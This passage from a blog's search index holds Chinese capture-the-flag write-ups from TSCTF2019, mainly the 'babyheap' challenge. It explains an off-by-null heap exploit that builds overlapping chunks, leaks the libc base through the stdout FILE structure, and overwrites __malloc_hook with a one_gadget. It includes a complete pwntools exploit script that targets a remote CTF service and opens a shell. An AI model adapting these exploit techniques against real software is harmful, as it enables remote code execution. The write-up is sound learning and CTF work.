class="string">'wz'</span>,<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'wz1'</span>,<span class="number">0x68</span>,<span class="string">'xmzyshypnc'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'wz2'</span>,<span class="number">0x68</span>,<span class="string">'xmzyshypnc'</span>)</span><br><span class="line">    CreateFileN(<span class="string">'1'</span>,<span class="string">'ama2in9'</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which directory do you want to put this file in: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>看代码，做题专注，不要太着急，慢慢调试慢慢理清思路，注意总结以前的思路。(感谢姚老板赛后给我的wp，获益匪浅)</p>
]]></content>
      <categories>
        <category>TSCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>babyheap</title>
    <url>/2020/09/03/tsctf2019/babyheap/</url>
    <content><![CDATA[<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末准备总结一下tsctf没做出来的题，这道题是姚老板出的，虽然姚老板鼓励我做出来，但是限于自己太菜，还是没能拿到flag，这里看着学长官方的wp总结一下</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序只有分配和删除两个函数，需要用文件结构体去泄露</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/1.jpg" alt="main"></p>
<p>Alloc函数分配堆块，read_data函数里存在one-byte-null漏洞，即可以多写一个空字节</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/2.jpg" alt="Alloc"></p>
<p><img src="/2020/09/03/tsctf2019/babyheap/4.jpg" alt="read_data"></p>
<p>Delete函数里会free掉分配的chunk指针并把bss存储地址和大小的位置清空</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/3.jpg" alt="delete"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露Libc基址"><a href="#泄露Libc基址" class="headerlink" title="泄露Libc基址"></a>泄露Libc基址</h3><p>libc泄露可以用文件结构体的方式，但是之前我们使用的是Tcache的dup，类似于2.23的double free，目前我们并没有直接可以用的double free，因此要通过chunk overlap构造重合的堆块，再进行double free。因为heap是0x1000对齐的，所以虽然开了随机化，后三位都是不变的。</p>
<p>第一次chunk布局：<br>chunk0:0x000-&gt;0x90<br>chunk1:0x090-&gt;0x40<br>chunk2:0x0d0-&gt;0x70<br>chunk3:0x140-&gt;0x100<br>chunk4:0x240-&gt;0x40<br>top_chunk:0x280  </p>
<p>Free(chunk2)再分配0x68大小的chunk，因为空间复用的关系实际上给的chunk为0x70，0x68-&gt;0x70这部分为chunk3的prev_size，可以将其覆盖为0x140，加上one-byte-null，chunk3的prev_in_use被覆盖为0，Free(0)再Free(3)即可使得0-3被覆盖为一个大的unsortedbin，其大小为0x240。此时main_arena+88已经被写到了0x000处。</p>
<p>根据之前Babytcache的经验，下面应该要让unsorted bin分配到的chunk和tcache dup可用的chunk为同一个chunk，在这里我们需要double free。再次构造一次Unsorted bin。</p>
<p>第二次chunk布局:<br>chunk0:0x000-&gt;0x90<br>chunk1:0x090-&gt;0x40<br>chunk2:0x0d0-&gt;0x70<br>chunk3:0x090-&gt;0x60//已经可以覆盖到0x0d0<br>chunk4:0x240-&gt;0x40<br>chunk5:0x0f0-&gt;0x50<br>chunk6:0x140-&gt;0x100(main_arena+88)  </p>
<p>Free(chunk5)之后分配0x48可以覆盖掉chunk6的prev_size和prev_in_use，Free(0)再Free(6)即可合并为一个Unsorted bin到0x000处。</p>
<p>Free(chunk2)使得0x0d0被放入fast bin[0x70]。</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/5.jpg" alt="bins"></p>
<p>继续更改chunk分配，第三次chunk布局：<br>chunk0:0x000-&gt;0xd0<br>chunk1:0x090-&gt;0x40<br>chunk2:0x0d0-&gt;0x30(main_arena+88)<br>chunk3:0x090-&gt;0x60<br>chunk4:0x240-&gt;0x40<br>chunk5:0x0f0-&gt;0x50<br>chunk6:0x100-&gt;0x100<br>chunk7:0x200-&gt;0x40<br>注意此时分配0xc0的时候会使得unsortebin切割到0x0c0，继而把main_arena+88写入到0x0d0，而此时的0x0d0已经位于fastbin[0x70]中。注意这里很巧妙的是分配0x20的时候写入的数据是’\n’，在read_data里直接进了if(buf==’\n’)从而使得没有任何数据写入到chunk2里，因此其fd没有变。<br>Free(chunk3)让fast bin[0x60]多了一个chunk,0x090，再分配一个0x50的chunk，用的是fast bin的0x090，使用’a’<em>0x30填充到0x0d0，然后可以覆盖(0x0d0)的内容为：<br>p64(0)<br>p64(0x71)<br>fd-&gt;</em>25dd<br>此时fast bin的fd也被修改为*25dd</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/6.jpg" alt="overwrite"></p>
<p>注意我们需要分配的是stdout，这里查看一下stdout的值，找一个离它近的fake_chunk下次修改为这个(关掉地址随机化方便调试)，之后分配到这个fake_chunk进而覆盖stdout，泄露得到地址，调试的时候拿vmmap看下偏移，即可算出Libc基地址</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/7.jpg" alt="offset"></p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>还是按照之前的套路，修改chunk11的prev_size和prev_in_use，此时堆布局如下:<br>chunk0:0x000-&gt;0xd0<br>chunk1:0x090-&gt;0x40<br>chunk2:0x0d0-&gt;0x30<br>chunk3:0x090-&gt;0x60<br>chunk4:0x240-&gt;0x40<br>chunk5:0x0f0-&gt;0x50<br>chunk6:0x100-&gt;0x100<br>chunk7:0x200-&gt;0x40<br>chunk8:0x0d0-&gt;0x70<br>chunk9:fake_chunk1-&gt;0x60<br>chunk10:290-&gt;0x20<br>chunk11:0x2a0-&gt;0x100<br>Free(chunk3)和Free(chunk8)使得产生两个fast bin</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/8.jpg" alt="free fast bins"></p>
<p>分配一个0x60大的chunk，覆写到0xd0处，修改其fd为target_addr</p>
<p><img src="/2020/09/03/tsctf2019/babyheap/9.jpg" alt="target_addr"></p>
<p>分配一个0x70chunk,再分配一个0x70大的chunk即可覆写<strong>malloc_hook，之后通过</strong>malloc_print_err触发malloc_hook，得到flag</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"info"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment">#p = process('./nofile')</span></span><br><span class="line"><span class="comment">#elf = ELF('./nofile')</span></span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'10.112.100.47'</span>,<span class="number">10003</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Input data: '</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input which chunk you want to delete: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Alloc(0x80,'a\n')#0</span></span><br><span class="line"><span class="string">    Alloc(0x30,'b\n')#1</span></span><br><span class="line"><span class="string">    Alloc(0x70-8,'d\n')#2</span></span><br><span class="line"><span class="string">    Alloc(0xf0,'d'*0xf0)#3</span></span><br><span class="line"><span class="string">    Alloc(0x30,'e\n')#4</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    Alloc(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>)<span class="comment">#3</span></span><br><span class="line">    Alloc(<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    Alloc(<span class="number">0x68</span>,<span class="string">'x'</span>*<span class="number">0x60</span>+p64(<span class="number">0x140</span>))</span><br><span class="line">    log.success(<span class="string">'overwrite ok!'</span>)</span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line">    Free(<span class="number">3</span>)</span><br><span class="line">    log.success(<span class="string">'free chunks ok!'</span>)</span><br><span class="line">    Alloc(<span class="number">0x80</span>,<span class="string">'z\n'</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(<span class="number">0x50</span>,<span class="string">'z\n'</span>)<span class="comment">#3----&gt;1,overlap 2</span></span><br><span class="line">    Alloc(<span class="number">0x40</span>,<span class="string">'z\n'</span>)<span class="comment">#5</span></span><br><span class="line">    Alloc(<span class="number">0xf0</span>,<span class="string">'z\n'</span>)<span class="comment">#6</span></span><br><span class="line">    log.success(<span class="string">'chunks re malloc ok!'</span>)</span><br><span class="line">    <span class="comment">#fast bin attack</span></span><br><span class="line">    Free(<span class="number">5</span>)</span><br><span class="line">    Alloc(<span class="number">0x48</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0xf0</span>+<span class="number">0x50</span>))<span class="comment">#5</span></span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line">    Free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    Alloc(<span class="number">0xc0</span>,<span class="string">'a\n'</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(<span class="number">0x20</span>,<span class="string">'\n'</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(<span class="number">0xf0</span>,<span class="string">'b\n'</span>)<span class="comment">#6</span></span><br><span class="line">    Alloc(<span class="number">0x30</span>,<span class="string">'c\n'</span>)<span class="comment">#7</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    Free(<span class="number">3</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span></span><br><span class="line">    Alloc(<span class="number">0x50</span>,payload)<span class="comment">#3</span></span><br><span class="line">    log.success(<span class="string">'ready to malloc fake chunk'</span>)</span><br><span class="line">    Alloc(<span class="number">0x60</span>,<span class="string">'wz\n'</span>)<span class="comment">#8</span></span><br><span class="line">    Alloc(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)<span class="comment">#9</span></span><br><span class="line">    p.recvuntil(<span class="string">'\x00\x18\xad\xfb'</span>)</span><br><span class="line">    p.recvn(<span class="number">28</span>)</span><br><span class="line">    libc_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">    log.info(<span class="string">'libc addr =&gt; '</span> + hex(libc_addr))</span><br><span class="line">    libc_base = libc_addr - <span class="number">0x3c5600</span></span><br><span class="line">    log.info(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    target_addr = libc_base + malloc_hook - <span class="number">0x23</span></span><br><span class="line">    log.success(<span class="string">'malloc hook addr =&gt; '</span> + hex(target_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">2</span>]</span><br><span class="line">    Alloc(<span class="number">0x10</span>,<span class="string">'wz\n'</span>)<span class="comment">#10</span></span><br><span class="line">    Alloc(<span class="number">0xf0</span>,<span class="string">'wz\n'</span>)<span class="comment">#11</span></span><br><span class="line">    Free(<span class="number">10</span>)</span><br><span class="line">    log.info(<span class="string">'before to overwrite next chunk'</span>)</span><br><span class="line">    Alloc(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0x60</span>))<span class="comment">#10</span></span><br><span class="line">    <span class="comment">#fast bin attack,modify __malloc_hook</span></span><br><span class="line">    Free(<span class="number">8</span>)</span><br><span class="line">    Free(<span class="number">3</span>)</span><br><span class="line">    Alloc(<span class="number">0x50</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(target_addr)+<span class="string">'\n'</span>)</span><br><span class="line">    Alloc(<span class="number">0x60</span>,<span class="string">'wz\n'</span>)<span class="comment">#8</span></span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">0x13</span> + p64(shell_addr) + <span class="string">'\n'</span></span><br><span class="line">    Alloc(<span class="number">0x60</span>,payload)</span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line"></span><br><span class="line">    Free(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><img src="/2020/09/03/tsctf2019/babyheap/10.jpg" alt="flag"></p>
<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>大佬们做堆跟玩速拼魔方一样，我写就跟背着公式一点点摸索一样。自己真是太菜了。这个题的思路是用off-byte-one制造大的unsorted bin，然后第一次分配产生overlap chunk，从而给堆溢出制造了空间。第二次还是这个套路，用unsorted bin切割之后的chunk的fd会被写入main_arena+88，这次直接到0x0d0处，在此之前0x0d0处的0x70大小的chunk已经进入了fast_bin(free(2))。所以达到了既在fast bin，其fd又为main_arena+88的目的。继续下去，free(3)可以得到刚才所说的0x090的堆块，用它溢出到0x0d0这个堆块修改其fd即可分配到stdout那里泄露地址。</p>
<p>同样的套路，刚才一顿操作使得chunk3那里是0x090，chunk8那里是0x0d0,删除它们并分配，用0x090覆盖到0x0d0，从而分配到__malloc_hook附近的fake_chunk，从而覆写其为one_gadget_addr。这里一个新知识是malloc_print_err触发的时候会使用malloc_hook，这里触发err的方法是和开始一样构造合并，但是因为要合并的0x040的next_chunk的prev_size与其size(0x40)不相等，造成error，最终得到shell</p>
]]></content>
      <categories>
        <category>TSCTF2019</category>
      </categories>
  </entry>
</search>
